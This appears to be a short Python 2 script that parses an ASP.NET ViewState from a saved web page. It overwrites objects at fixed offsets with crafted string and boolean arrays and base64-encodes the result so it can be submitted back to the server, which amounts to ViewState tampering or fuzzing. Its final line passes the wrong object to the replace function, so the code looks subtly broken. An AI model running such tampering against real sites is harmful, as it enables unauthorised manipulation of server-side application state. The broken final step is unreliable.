from peekviewstate import *;

#parse  vs data here 

vs = split_webpage_data("".join(open("local_webpage.txt").readlines()))

d,o = parse(vs)
# Create and assign some data to SystemStringArray
ds = SystemStringArray()
ds.size = 60
ds.data = ["A"*(i+1) for i in xrange(0,60)]
# Create a Full Array of Boolean Types
g = FullArray()
g.array_type = g.types_names['Boolean']
g.size = 60
g.data = [BooleanFalse() for i in xrange(0,60)]
# replace by object
# only does a single, linear replace 
ns = replace_by_object(vs, 5548, g)
ns = replace_by_object(ns, 2501, g)
ns = replace_by_object(ns, 1703, ds)
ns = replace_by_object(ns, 4750, ds)
d, o = parse(ns, 0)

# creates a viewstate object that can be submitted back to the server
viewstate = b64encode(ns)

p = FullArray()
p.array_type = p.types_names['Boolean']
p.size = 60
p.data = [BooleanFalse() for i in xrange(0,60)]
ns = replace_by_object(g, 5548, p)
